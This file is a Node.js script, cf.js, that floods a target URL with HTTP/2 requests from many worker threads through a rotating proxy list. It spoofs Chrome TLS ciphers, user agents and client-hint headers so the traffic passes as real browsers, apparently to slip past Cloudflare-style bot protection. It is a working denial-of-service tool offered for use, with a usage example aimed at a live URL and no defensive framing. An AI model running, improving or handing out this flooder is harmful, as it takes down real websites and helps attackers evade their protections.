const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);

if (process.argv.length < 5) {
    console.log(`Usage: node cf.js <url> <time> <rate> <threads>`);
    console.log(`Example: node cf.js https://c3.dstatbot.win/Sk87LhCJ 180 16 8`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsed = url.parse(args.target);
const path = parsed.path;

// Load proxies
let proxies = [];
try {
    proxies = fs.readFileSync("proxy.txt", "utf-8")
        .split(/\r?\n/)
        .filter(line => line.trim() && line.includes(":"))
        .map(line => line.trim());
    console.log(`Loaded ${proxies.length} proxies`);
} catch(e) {
    console.log("No proxy.txt found, using direct connection");
}

// TLS Cipher - match dengan browser modern
const ciphers = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305"
].join(":");

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    honorCipherOrder: true,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
});

// Realistic User Agents
const uas = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

// Stats
let stats = { total: 0, ok: 0, bad: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`🎯 Target: ${args.target}`);
    console.log(`🔗 Path: ${path}`);
    console.log(`⏱️ Time: ${args.time}s | Rate: ${args.rate}/s | Threads: ${args.threads}`);
    console.log(`🌐 Proxy: ${proxies.length > 0 ? `${proxies.length} proxies` : "Direct"}`);
    console.log(`====================================`);
    
    for (let i = 0; i < args.threads; i++) cluster.fork();
    
    setInterval(() => {
        const successRate = stats.total > 0 ? ((stats.ok/stats.total)*100).toFixed(2) : 0;
        console.log(`[${new Date().toLocaleTimeString()}] Total: ${stats.total} | ✅ ${stats.ok} (${successRate}%) | ❌ ${stats.bad} | 🔗 ${stats.active}`);
    }, 3000);
    
    setTimeout(() => {
        const successRate = stats.total > 0 ? ((stats.ok/stats.total)*100).toFixed(2) : 0;
        console.log(`\n✅ Finished!`);
        console.log(`📊 Total: ${stats.total} | Success: ${stats.ok} (${successRate}%) | Failed: ${stats.bad}`);
        process.exit();
    }, args.time * 1000);
} else {
    // Random start delay biar ga serempak
    setTimeout(() => {
        setInterval(() => {
            if (stats.active < 3000) attack();
        }, Math.max(10, Math.floor(1000 / args.rate)));
    }, Math.random() * 1000);
}

function getProxy() {
    if (proxies.length === 0) return null;
    const p = proxies[Math.floor(Math.random() * proxies.length)].split(":");
    return { host: p[0], port: parseInt(p[1]) };
}

function attack() {
    stats.active++;
    
    const proxy = getProxy();
    
    const doRequest = (socket = null) => {
        const tlsOpts = {
            host: parsed.host,
            port: 443,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ciphers,
            honorCipherOrder: true,
            secureContext: secureContext,
            rejectUnauthorized: false,
            servername: parsed.host
        };
        
        if (socket) tlsOpts.socket = socket;
        
        const conn = tls.connect(tlsOpts, () => {
            const client = http2.connect(`https://${parsed.host}`, {
                createConnection: () => conn
            });
            
            let reqCount = 0;
            const maxReqs = args.rate * 10; // Max request per connection
            
            const interval = setInterval(() => {
                if (reqCount++ >= maxReqs) {
                    clearInterval(interval);
                    client.destroy();
                    if (socket) socket.destroy();
                    if (stats.active > 0) stats.active--;
                    return;
                }
                
                const req = client.request({
                    ":method": "GET",
                    ":path": path,
                    ":scheme": "https",
                    ":authority": parsed.host,
                    "user-agent": uas[Math.floor(Math.random() * uas.length)],
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "accept-language": "en-US,en;q=0.9",
                    "accept-encoding": "gzip, deflate, br",
                    "cache-control": "no-cache",
                    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "upgrade-insecure-requests": "1"
                });
                
                req.on("response", (headers) => {
                    stats.total++;
                    if (headers[":status"] === 200) stats.ok++;
                    else stats.bad++;
                    req.destroy();
                });
                
                req.on("error", () => {
                    stats.total++;
                    stats.bad++;
                });
                
                req.end();
            }, Math.floor(1000 / args.rate));
            
            // Auto close after time
            setTimeout(() => {
                clearInterval(interval);
                client.destroy();
                if (socket) socket.destroy();
                if (stats.active > 0) stats.active--;
            }, args.time * 1000);
        });
        
        conn.on("error", () => {
            if (stats.active > 0) stats.active--;
            if (socket) socket.destroy();
        });
    };
    
    if (proxy) {
        const proxyConn = net.connect({ host: proxy.host, port: proxy.port });
        
        proxyConn.setTimeout(10000);
        
        proxyConn.on("connect", () => {
            proxyConn.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\n\r\n`);
        });
        
        proxyConn.on("data", (data) => {
            if (data.toString().includes("200") || data.toString().includes("Connection established")) {
                proxyConn.removeAllListeners("data");
                doRequest(proxyConn);
            } else {
                proxyConn.destroy();
                if (stats.active > 0) stats.active--;
            }
        });
        
        proxyConn.on("error", () => {
            if (stats.active > 0) stats.active--;
        });
        
        proxyConn.on("timeout", () => {
            proxyConn.destroy();
            if (stats.active > 0) stats.active--;
        });
    } else {
        doRequest(null);
    }
}

process.on('uncaughtException', () => {});
